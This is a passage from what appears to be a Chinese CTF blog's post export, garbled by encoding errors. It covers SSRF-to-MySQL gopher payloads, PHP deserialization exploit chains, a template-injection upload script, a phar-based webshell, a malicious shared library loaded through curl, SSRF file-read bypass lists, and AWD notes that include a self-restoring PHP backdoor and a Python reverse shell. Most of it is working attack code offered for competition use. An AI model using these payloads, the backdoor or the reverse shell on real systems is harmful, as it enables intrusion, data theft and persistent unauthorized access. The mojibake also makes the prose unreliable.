è®¤è¯æ—¶ç›´æ¥å‘é€ TCP/IP æ•°æ®åŒ…å³å¯ã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹æ˜¯å¯ä»¥ç›´æ¥åˆ©ç”¨ SSRF æ¼æ´æ”»å‡» MySQL çš„ã€‚å› ä¸ºä½¿ç”¨ gopher åè®®è¿›è¡Œæ”»å‡»éœ€è¦åŸå§‹çš„ MySQL è¯·æ±‚çš„ TCP æ•°æ®åŒ… def results(s): a=[s[i:i+2] for i in range(0,len(s),2)] return gopher://172.72.23.29:3306/_%+%.join(a)if __name__==__main__: s = a100000185a23f0000000001080000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033530380f5f636c69656e745f76657273696f6e06352e362e3531095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420313d0000000373656c656374202a2066726f6d20666c61672e7465737420756e696f6e2073656c656374207573657228292c277777772e73716c7365632e636f6d270100000001 print(results(s)) gopher://172.72.23.29:3306/_%a1%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%35%30%38%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%3d%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%2e%74%65%73%74%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%75%73%65%72%28%29%2c%27%77%77%77%2e%73%71%6c%73%65%63%2e%63%6f%6d%27%01%00%00%00%01 UDFææƒSSRFæ”»å‡»MySQLä»…ä»…æŸ¥è¯¢æ•°æ®æ„ä¹‰ä¸å¤§ï¼Œä¸å¦‚ç›´æ¥UDFææƒç„¶ååå¼¹shellå‡ºæ¥æ›´åŠ ç›´æ¥ UDF (User Defined Function) æ˜¯ MySQL çš„ä¸€ä¸ªæ‰©å±•æœºåˆ¶ï¼Œå¯ä»¥è®©æ•°æ®åº“åŠ è½½å¤–éƒ¨åŠ¨æ€é“¾æ¥åº“ï¼ˆLinux ä¸‹æ˜¯ .soï¼ŒWindows ä¸‹æ˜¯ .dllï¼‰ï¼Œæ³¨å†Œæˆå‡½æ•°ï¼Œç„¶åå°±èƒ½åœ¨ SQL è¯­å¥é‡Œè°ƒç”¨ã€‚ é¦–å…ˆä½ è¦å…ˆçŸ¥é“mysqlçš„æ’ä»¶ç›®å½• gopher://172.72.23.29:3306/_%a2%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%65%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%33%35%35%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%0a%27%25%70%6c%75%67%69%6e%25%27%01%00%00%00%01 å¯çŸ¥æ’ä»¶ç›®å½•ä¸º usrlibmysqlplugin è¿™é‡Œè¿˜å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå·¥å…· https://github.com/tarunkant/Gopherus python2ç¯å¢ƒ fpmï¼ˆFastCGIåè®®ï¼‰è¯¦ç»†åŸç†æ–‡ç« Fastcgiåè®®åˆ†æ PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ Expç¼–å†™ | ç¦»åˆ«æ­Œ å¯ä»¥ä½¿ç”¨ä¸Šè¿°çš„å·¥å…· å…·ä½“æ“ä½œï¼š gopherus --exploit fastcgi å³å¯æ‰“é€š","tags":["CTFå­¦ä¹ "]},{"title":"NSS4th-wp","path":"/2025/08/24/NSS4th/","content":"sigininMongoDBæ³¨å…¥ POST /search HTTP/1.1Host: node9.anna.nssctf.cn:28628Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://node9.anna.nssctf.cn:28628/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1754295247Connection: closeContent-Length: 73Content-Type:application/json title: $ne: null , author: $ne: null ez_uploadä¼ æ–‡ä»¶å‘ç°ä»€ä¹ˆä¸œè¥¿éƒ½æ²¡å›æ˜¾ æç¤ºä¸Šä¼ zip å°è¯• è½¯é“¾æ¥ å‚è€ƒæ–‡ç«  https://blog.csdn.net/qq_44640313/article/details/130968721 ä¾æ¬¡ä¸Šä¼ 1.zipå’Œ2.zip è®¿é—®åˆ›é€ çš„1.php phpinfoç¯å¢ƒå˜é‡æœ‰ä¸€ä¸ªflag è¿™é‡Œflagä¹Ÿæœ‰ä¸€ä¸ª å‡ºé¢˜ä¸åˆ ç¯å¢ƒå˜é‡qaq ez_crccrcç¢°æ’ é—®ai aiå†™è„šæœ¬ æœ€åç»™å‡ºä¸€ä¸ª Po_QyFcIoCVviMA [mpga]filesystemä¸‹è½½æ–‡ä»¶www.zip é‡Œé¢æœ‰æºç  ååºåˆ—åŒ– rceå³å¯ ?phpclass ApplicationContext public $contextName; class ContentProcessor private $processedContent; public $callbackFunction = system; public function __construct() $this-processedContent = new FunctionInvoker(); class FileManager public $targetFile; public $responseData;class FunctionInvoker public $functionName; public $functionArguments; $a = new ApplicationContext();$a - contextName = new FileManager();$a - contextName - targetFile = new ContentProcessor();echo urlencode(serialize($a));//O%3A18%3A%22ApplicationContext%22%3A1%3A%7Bs%3A11%3A%22contextName%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A2%3A%7Bs%3A12%3A%22functionName%22%3BN%3Bs%3A17%3A%22functionArguments%22%3BN%3B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3BN%3B%7D%7Dfile_to_check=O%3A18%3A%22ApplicationContext%22%3A1%3A%7Bs%3A11%3A%22contextName%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A2%3A%7Bs%3A12%3A%22functionName%22%3BN%3Bs%3A17%3A%22functionArguments%22%3BN%3B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3BN%3B%7D%7Dsubmit_md5=1method=performWriteOperationvar=processedContentcmd=cat /flag","tags":["CTF-wp"]},{"title":"LILCTF 2025","path":"/2025/08/19/LilCTF2025/","content":"Ekko_noteå®¡è®¡æºç  å¤§æ¦‚æ€è·¯å°±æ˜¯:æœ‰ä¸€ä¸ªç®¡ç†å‘˜é¢æ¿ adminæ‰èƒ½è®¿é—®å¹¶ä¸”è¦åˆ°2066å¹´ä»¥åæ‰å¯ä»¥è®¿é—® adminé€šè¿‡sessionä¼ªé€  æ—¶é—´apiå¯ä»¥ä¿®æ”¹ æ³¨å†Œè´¦å·ï¼Œç™»å½•åä¼ªé€ adminçš„sessionè¿›å» python flask_session_cookie_manager3.py encode -s your-secret-key-here -t is_admin: True, user_id: 1, username: admin åœ¨æœåŠ¡å™¨èµ·ä¸€ä¸ªapiæœåŠ¡ï¼Œä¿®æ”¹apiä¸ºæœåŠ¡å™¨çš„api from flask import Flask, jsonifyapp = Flask(__name__)@app.route(/time)def fake_time(): return jsonify(date:2066-08-15 16:14:34,weekday:æ˜ŸæœŸäº”,timestamp:1755245674,remark:ä»»ä½•æƒ…å†µè¯·è”ç³»QQ:3295320658 å¾®ä¿¡æœåŠ¡å·:é¡ºæˆç½‘ç»œ)if __name__ == __main__: app.run(host=0.0.0.0, port=2333) ä¿®æ”¹apiåè¿›å…¥é¢æ¿ ç›´æ¥æ‰§è¡Œå‘½ä»¤æ²¡æœ‰å›æ˜¾ è¯•åå¼¹shell python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((your_ip,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/sh) ez_bottleåœ¨uploadä¸Šä¼ æ–‡ä»¶ ç»•è¿‡é»‘åå• [, , os, eval, exec, sock, , , bul, class, ?, :, bash, _, globals, get, open] ä½¿ç”¨äº†setattrçš„pythonå‡½æ•° setattr(obj, name, value) % import bottle % setattr(bottle, TEMPLATE + chr(95) + PATH, [/]) % include(flag) å¤§æ„å°±æ˜¯æŠŠBottle æ¨¡æ¿å¼•æ“åœ¨ä»€ä¹ˆç›®å½•ä¸‹æœç´¢æ¨¡æ¿æ–‡ä»¶æ”¹ä¸ºäº†æ ¹ç›®å½• ç„¶åincludeäº†flagæ–‡ä»¶ å†™è„šæœ¬ä¸Šä¼ å‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…é‡Œé¢æ˜¯åŒ…å«bottleè¯­å¥çš„txtæ–‡ä»¶ import ioimport zipfileimport requestsdef make_zip_payload() - io.BytesIO: txt = % import bottle % setattr(bottle, TEMPLATE + chr(95) + PATH, [/]) % include(flag) buf = io.BytesIO() with zipfile.ZipFile(buf, w, zipfile.ZIP_DEFLATED) as z: z.writestr(exploit, txt) buf.seek(0) return bufdef upload_zip_file(target_url: str): zbuf = make_zip_payload() files = file: (exploit.zip, zbuf, application/zip) print(f[*] æ­£åœ¨ä¸Šä¼ æ¶æ„ZIPæ–‡ä»¶åˆ° target_url...) try: r = requests.post( target_url, files=files, timeout=20, headers=User-Agent: Mozilla/5.0 ) if r.status_code == 200: print([+] æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼) print([*] æœåŠ¡å™¨å“åº”:, r.text[:300]) else: print(f[!] ä¸Šä¼ å¤±è´¥ï¼ŒçŠ¶æ€ç : r.status_code) print([!] é”™è¯¯å“åº”:, r.text[:300]) except Exception as e: print(f[!] ä¸Šä¼ è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: str(e))if __name__ == __main__: TARGET_UPLOAD_URL = http://challenge.xinshi.fun:40967/upload upload_zip_file(TARGET_UPLOAD_URL) print([*] ä¸Šä¼ å®Œæˆ ) è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¾—åˆ°flag Your Uns3r?phphighlight_file(__FILE__);class User public $username; public $value; public function exec() $ser = unserialize(serialize(unserialize($this-value))); if ($ser != $this-value $ser instanceof Access) include($ser-getToken()); public function __destruct() if ($this-username == admin) $this-exec(); class Access protected $prefix; protected $suffix; public function getToken() if (!is_string($this-prefix) || !is_string($this-suffix)) throw new Exception(Go to HELL!); $result = $this-prefix . lilctf . $this-suffix; if (strpos($result, pearcmd) !== false) throw new Exception(Can I have peachcmd?); return $result; $ser = $_POST[user];if (strpos($ser, admin) !== false strpos($ser, Access:) !== false) exit (no way!!!!);$user = unserialize($ser);throw new Exception(nonono!!!); è¿™é“é¢˜å‡ºå¾—å¾ˆå¥½(èµ 1.æ˜¯æŠ›å‡ºé”™è¯¯ ä½¿ç”¨gcå›æ”¶æœºåˆ¶æ¥ç»•è¿‡ è¿™æ ·å°±å¯ä»¥è§¦å‘__destruct__é­”æœ¯æ–¹æ³•ç»•è¿‡æŠ›å‡ºé”™è¯¯ 2.æ˜¯adminå’ŒAcessçš„ç»•è¿‡ åªè¦ä¸åŒæ—¶å‡ºç°å°±å¥½ Acessæ˜¯ç±»å ä½¿ç”¨å¤§å°å†™ç»•è¿‡ 3.$result $this-prefix . â€˜lilctfâ€™ . $this-suffix ç»•è¿‡è¿™ä¸ªlilctfä½¿ç”¨..æ¥ç»•è¿‡ 4.unserialize(serialize(unserialize($this-value))) valueèµ‹å€¼ä¸ºserialize($b)å°±è¡Œ ?phpclass User public $username=admin; public $value;class Access protected $prefix=php://filter/convert.base64-encode/resource=/; protected $suffix=/../flag;$a = new User();$b = new Access();$a-value = serialize($b);$c=array(a=$a,b=NULL);echo urlencode(serialize($c)); ç”Ÿæˆ: a%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22value%22%3Bs%3A117%3A%22O%3A6%3A%22Access%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A45%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A8%3A%22%2F..%2Fflag%22%3B%7D%22%3B%7Ds%3A1%3A%22b%22%3BN%3B%7D æŠŠæœ€åçš„ a:2:s:1:a;O:4:User:2:s:8:username;s:5:admin;s:5:value;s:117:O:6:Access:2:s:9:*prefix;s:45:php://filter/convert.base64-encode/resource=/;s:9:*suffix;s:8:/../flag;;s:1:b;N;æ”¹ä¸ºa:2:s:1:a;O:4:User:2:s:8:username;s:5:admin;s:5:value;s:117:O:6:access:2:s:9:*prefix;s:45:php://filter/convert.base64-encode/resource=/;s:9:*suffix;s:8:/../flag;;s:1:User;N; urlencodeå³å¯ php_jail_is_my_cry?phpif (isset($_POST[url])) $url = $_POST[url]; $file_name = basename($url); $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); if ($data) file_put_contents(/tmp/.$file_name, $data); echo æ–‡ä»¶å·²ä¸‹è½½: a href=?down=$file_name$file_name/a; else echo ä¸‹è½½å¤±è´¥ã€‚; if (isset($_GET[down])) include /tmp/ . basename($_GET[down]); exit;// ä¸Šä¼ æ–‡ä»¶if (isset($_FILES[file])) $target_dir = /tmp/; $target_file = $target_dir . basename($_FILES[file][name]); $orig = $_FILES[file][tmp_name]; $ch = curl_init(file://. $orig); // I hide a trick to bypass open_basedir, Im sure you can find it. curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); curl_close($ch); if (stripos($data, ?) === false stripos($data, php) === false stripos($data, halt) === false) file_put_contents($target_file, $data); else echo å­˜åœ¨ `?` æˆ–è€… `php` æˆ–è€… `halt` æ¶æ„å­—ç¬¦!; $data = null; ? ç®€å•çš„phpä»£ç  ä¸‰ä¸ªç‚¹ä¸‹è½½æ–‡ä»¶ åŒ…å«æ–‡ä»¶ ä¸Šä¼ æ–‡ä»¶ å¾ˆæ˜æ˜¾çš„ä¸å‡†ä¸Šä¼ ä¸€å¥è¯phpæœ¨é©¬ è¿™é‡Œæœ‰æ–‡ä»¶åŒ…å«å¾ˆå®¹æ˜“è”æƒ³åˆ°ä½¿ç”¨gzæ‰“åŒ…çš„pahræ–‡ä»¶æ¥ç»•è¿‡ includeå¯ä»¥ç›´æ¥è§£ægzæ–‡ä»¶ å†™ä¸€å¥è¯æœ¨é©¬ https://xz.aliyun.com/news/18584 ?php$phar = new Phar(12.phar);$phar -startBuffering();$stub = STUB?phpfile_put_contents(/var/www/html/.php,?=eval($_POST[1])?);__HALT_COMPILER();? STUB;$phar -setStub($stub);$phar -addFromString(test.txt, test);$phar -stopBuffering();? ç”Ÿæˆçš„pharæ–‡ä»¶æ‰“åŒ…æˆgz gzip 12.phar æºç phpiniæˆ–è€…è¿™é‡Œçš„ç¯å¢ƒéƒ½ç»™äº†disablefunctions å‡ ä¹æŠŠæ‰€æœ‰ç¦å®Œäº† æç¤º â€‹ I hide a trick to bypass open_basedir, Iâ€™m sure you can find it. open_basedir/var/www/html:/tmp/var/www/html:/tmp ä½¿ç”¨curlæ¥è¿›è¡Œå‘½ä»¤rce è¯¥curlå‘½ä»¤è¡Œå·¥å…·åœ¨ç±» POSIX ç³»ç»Ÿï¼ˆLinuxã€macOS ç­‰ï¼‰ä¸Šå­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥--engineé€‰é¡¹å…è®¸ä»å…±äº«åº“ï¼ˆæ–‡ä»¶ï¼‰åŠ è½½ OpenSSL åŠ å¯†å¼•æ“.soã€‚å…³é”®åœ¨äºï¼Œè¯¥é€‰é¡¹æ¥å—åº“æ–‡ä»¶çš„ç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„ï¼Œä»è€Œå…è®¸ç”¨æˆ·åŠ è½½æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»ä½•å…±äº«åº“ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªåŒ…å«__attribute__((constructor))å‡½æ•°çš„æ¶æ„å…±äº«åº“ã€‚è¯¥å‡½æ•°ä¼šåœ¨åº“åŠ è½½åˆ°è¿›ç¨‹å†…å­˜æ—¶ç”±åŠ¨æ€åŠ è½½å™¨æ‰§è¡Œcurlï¼Œä»è€Œå®ç°ç«‹å³ä»£ç æ‰§è¡Œï¼Œç”šè‡³åœ¨ OpenSSL å°è¯•å°†å…¶åˆå§‹åŒ–ä¸ºå¼•æ“ä¹‹å‰ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥å½±å“ä¼ é€’ç»™å‘½ä»¤çš„å‚æ•°curlï¼Œè¿™å°†å¯¼è‡´ç›´æ¥ RCEï¼Œè¿™æ˜¯ Web åº”ç”¨ç¨‹åºåç«¯ã€CI/CD ç®¡é“å’Œå…¶ä»–è‡ªåŠ¨åŒ–è„šæœ¬ä¸­çš„å¸¸è§æƒ…å†µã€‚ https://hackerone.com/reports/3293801 é€šè¿‡ç¼–è¯‘ä¸€ä¸ª.soæ–‡ä»¶è¿›è¡Œè¯»å–realflagæ–‡ä»¶ #include stdlib.h__attribute__((constructor))static void rce_init(void) system(/readflag ./flag.txt); ä¸Šä¼ soæ–‡ä»¶æˆåŠŸåå›åˆ°åŸæ¥çš„æœ¨é©¬ç•Œé¢ 1=$ch = curl_init(http://www.azureyinglong.cn);curl_setopt($ch, CURLOPT_SSLENGINE , /tmp/sauy.so);$data = curl_exec($ch);curl_close($ch); è®¿é—®flag.txtæ‹¿åˆ°flag æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œâ€‹","tags":["CTF-wp"]},{"title":"SSRFæŠ€å·§æ€»ç»“","path":"/2025/08/04/SSRFæŠ€å·§æ€»ç»“/","content":"Â·ä»¥ä¸‹ 3 ç§ä¸»è¦æ–¹å¼åœ¨ PHP ä¸­æ£€ç´¢ URLcurl library (CURLåº“)ç”¨äºå‘èµ·ç½‘ç»œè¯·æ±‚ï¼ˆHTTPã€HTTPSã€FTP ç­‰) å¯ä»¥è®¾ç½® å¤æ‚è¯·æ±‚å¤´ GET/POST/PUT å¯ä»¥æ”¯æŒå¤æ‚åè®® HTTP/HTTPS/FTP/SMTP file_get_contents (å‡½æ•°)æ”¯æŒ http://ã€https:// ç­‰ URLï¼ˆå‰ææ˜¯ PHP allow_url_fopen = Onï¼‰ æ”¯æŒè¯»å–æ•æ„Ÿæœ¬åœ°æ–‡ä»¶ file_get_contents(file:///etc/passwd); exec()exec(ping . $_GET[ip]); Â·å®¹æ˜“å—æ”»å‡»çš„ä»£ç situation-1-filter_var()filter_var()PHP æä¾›çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥è¿‡æ»¤å’ŒéªŒè¯å˜é‡ã€‚ filter_var($value, $filter, $options); FILTER_VALIDATE_URLPHP é¢„å®šä¹‰çš„è¿‡æ»¤å™¨ä¹‹ä¸€ ç”¨æ³•:filter_var(â€˜http://example.comâ€˜, FILTER_VALIDATE_URL); ä½œç”¨ï¼šç”¨æ¥æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä¸€ä¸ªåˆæ³•çš„ URL FILTER_FLAG_QUERY_REQUIREDÂ·ç±»å‹ï¼šPHP å†…ç½®è¿‡æ»¤å™¨çš„ æ ‡å¿—ï¼ˆflagï¼‰ã€‚ Â·ç”¨é€”ï¼šä¸ FILTER_VALIDATE_URL æ­é…ä½¿ç”¨ï¼Œè¦æ±‚ URL å¿…é¡»åŒ…å«æŸ¥è¯¢å­—ç¬¦ä¸²ã€‚ $url = http://example.com;$result = filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED);var_dump($result); // falseï¼Œå› ä¸ºæ²¡æœ‰æŸ¥è¯¢å­—ç¬¦ä¸²$url = http://example.com/?id=1;$result = filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED);var_dump($result); // string(26) http://example.com/?id=1 æ”»å‡»é¢?phpfunction curl($url) $optArray = array( CURLOPT_URL = $url, CURLOPT_FOLLOWLOCATION = 1 ); $ch = curl_init(); curl_setopt_array($ch, $optArray); $response = curl_exec($ch) or die(Error!); curl_close($ch); return $response;$content = curl(filter_var($_GET[url], FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED));echo $content; æ”»å‡»æ–¹æ³•: file:/etc/passwd?/ file:/etc%252Fpasswd?/ è¯»å–flagfile:/flag? situation-2- file_get_contents()?php$f = filter_var($_GET[url], FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED) or die(Error!);echo file_get_contents($f); POC: file:///etc/?/../passwd è§£é‡Š:å°†å…¶ç”¨ä½œç›®å½•æ–‡ä»¶å¤¹åç§°æ—¶ï¼Œâ€œ?â€ çš„ä½¿ç”¨ä½¿å…¶é€šè¿‡éªŒè¯ã€‚ç„¶åï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨â€œ..â€æŠ€å·§æ¥è¿”å›åˆ°â€œetcâ€ã€‚ è¯»å–flag file:///etc/?/../../flag situation-3?php$url = filter_var($_GET[url], FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED);exec(curl -L . $url, $content) or die(Error!);print_r($content); POCï¼š file:/etc/passwd?/ file:$br/et$uc/pas$teswd?/ è¯»å–flagä¹Ÿæ˜¯ä¸€æ ·çš„: file:/flag?/ file:$br/fl$teag?/ è§£é‡Š:å› ä¸º$xï¼ˆå…¶ä¸­xå¯ä»¥æ˜¯ä»»ä½•å¸¸è§„å­—ç¬¦æˆ–å­—ç¬¦ä¸²ï¼‰åœ¨ Bash ä¸­ç”¨äºæ›¿æ¢å˜é‡ï¼Œè¯¥å˜é‡å¿…é¡»ä¸å­˜åœ¨ï¼Œå¦åˆ™ä¼šåœ¨æ‰§è¡Œçš„å‘½ä»¤ä¸­è¢«ä¸¢å¼ƒã€‚$(x)ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚ æ±‡æ€»pocfile:/etc/passwd?/file:/etc/passwd%3F/file:/etc%252Fpasswd/file:/etc%252Fpasswd%3F/file:///etc/?/../passwdfile:///etc/%3F/../passwdfile:$br/et$uc/pas$teswd?/file:$(br)/et$(u)c/pas$(te)swd?/file:$br/et$uc%252Fpas$teswd?/file:$(br)/et$(u)c%252Fpas$(te)swd?/file:$br/et$uc%252Fpas$teswd%3F/file:$(br)/et$(u)c%252Fpas$(te)swd%3F/file:///etc/passwd?/../passwd","tags":["CTFå­¦ä¹ "]},{"title":"AWDç¬”è®°","path":"/2025/08/03/AWDè®°å½•/","content":"AWDè®°å½•æ”¹linuxå¯†ç passwd è¾“å…¥æ–°å¯†ç å³å¯ æœ‰æƒé™åˆ é™¤ç”¨æˆ·userdel -r [ç”¨æˆ·å] æ”¹mysqlå¯†ç update mysql.user set passwordpassword(â€˜å¯†ç â€™) where userâ€™rootâ€™; 1. ç™»å½• mysql ç»ˆç«¯ï¼Œè¿è¡Œï¼šmysql set password=password(new password);mysqlflush privileges;2. ä¿®æ”¹ mysql user è¡¨mysqluse mysql;mysqlupdate user set password=password(new password) where user=root;mysqlflush privileges;3. ä½¿ç”¨ GRANT è¯­å¥mysqlGRANT ALL PRIVILEGES ON *.* TO root@127.0.0.1 IDENTIFIED BY new password WITH GRANT OPTION;mysqlflush privileges;4. mysqladmin[root@ubuntu]# mysqladmin -u root password new password;ï¼ˆæ³¨æ„åŒå¼•å·æˆ–ä¸åŠ ï¼‰ åˆ é™¤åŒ¿åç”¨æˆ·delete from mysql.user where userâ€™ â€˜; åˆ·æ–°é…ç½®flush privileges; æ”¹ç½‘ç«™åå°å¯†ç ä»ç½‘ç«™é¡µé¢æˆ–è€…æºç æˆ–è€…å¾¡å‰‘å·¥å…·æ‰¾åˆ°åå°é¡µé¢ï¼Œç„¶åå°è¯•å¼±å£ä»¤ç™»å…¥åæ”¹ç®¡ç†å‘˜å¯†ç ã€‚ ç½‘ç«™ç›®å½•æ‰“åŒ…æˆcd varwwwhtml tar -cvf [æ‰“åŒ…åçš„æ–‡ä»¶å.tar] * zip -r è¾“å‡ºæ–‡ä»¶å.zip ç›®å½•å å°†å‹ç¼©åŒ…è§£å‹ï¼Œç„¶åæ‹‰åˆ°Dç›¾é‡Œé¢æ‰«ææœ¨é©¬æ–‡ä»¶ æŸ¥çœ‹æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶ls -ltR | head -n 10 æŸ¥çœ‹è¿›ç¨‹who æ€æ­»è¿›ç¨‹pkill -kill -t ptsè¿›ç¨‹å· ffufæ‰«æå­˜æ´»çš„ç«¯å£ffud -u url.FUZZ.url number.txt ç™»å½•mysql1.navicat mysqlé»˜è®¤ç«¯å£3306 å¯èƒ½ä¸å…è®¸å¤–éƒ¨è¿æ¥ 2.æœåŠ¡å™¨é‡Œç™»å½• mysql -u [username] -p ä¸æ­»é©¬sauy.php ?phpignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = ./index.php;$code = ?php if(md5($_POST[pass])==02db7748bedfcd5dafc502d63228f455)@eval($_POST[a]); ?;while (1)\tfile_put_contents($file,$code);\tusleep(5000);//hacked by sauy? passRimuru20250802 é©¬å„¿ç”¨æ³•ï¼šfuckyou.php?passRimuru20250802acommand æ€ä¸æ­»é©¬æ€æ­»ä¸æ­»é©¬çš„æ–¹æ³•ï¼ŒæŸ¥çœ‹ä¸æ­»é©¬çš„è¿›ç¨‹IDï¼š # top | grep httpd chmod 777 kill.sh nohup .kill.sh æŸ¥åˆ°IDä¸º 11198 ï¼Œæ ¹æ®IDå·å’Œwebshellåå†™.shè„šæœ¬ã€‚ # vim kill.sh #!/bin/bashwhile truedo kill -9 11198 2/dev/null rm -f .shell.phpdone è°ƒå–è‡ªå·±çš„webshellä¸æ–­äº¤flagimport requeststoken = nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]targets = [fhttp://192-168-1-i.pvp6258.bugku.cn/.sauy.php for i in nums]for url in targets: try: print(f[+] Checking url) resp = requests.post(url, data=cmd: cat /flag, timeout=3) flag = resp.text.strip() if flag in flag: # ç®€å•åˆ¤æ–­ print(f[+] Got flag from url: flag) submit_url = fhttps://ctf.bugku.com/pvp/submit.html?token=tokenflag=flag r = requests.get(submit_url) print(f[+] Submit response: r.text) else: print(f[-] No flag at url) except requests.RequestException as e: print(f[-] url Failed: e) ffufæ‰«æå­˜æ´»ç½‘å£ffuf -u http://192-168-1-FUZZ.pvp6258.bugku.cn -w number.txt -mc 200,403","tags":["AWD"]},{"title":"PHPååºåˆ—åŒ–æ€»ç»“","path":"/2025/08/01/phpååºåˆ—åŒ–æ€»ç»“/","content":"å¿…çŸ¥çŸ¥è¯†protected å’Œ privateprivate:å˜é‡åå‰åŠ â€%00[ç±»å]%00â€ ?phpclass test private $pub=benben; function jineng() echo $this-pub; $a = new test();echo serialize($a);?O:4:test:1:s:9:testpub;s:6:benben; protected:å˜é‡åå‰åŠ â€%00*%00â€ ?phpclass test protected $pub=benben; function jineng() echo $this-pub; $a = new test();echo serialize($a);?O:4:test:1:s:6:*pub;s:6:benben; é­”æœ¯æ–¹æ³•__construct() //å½“å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œä¼šè§¦å‘è¿›è¡Œåˆå§‹åŒ–__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__sleep() 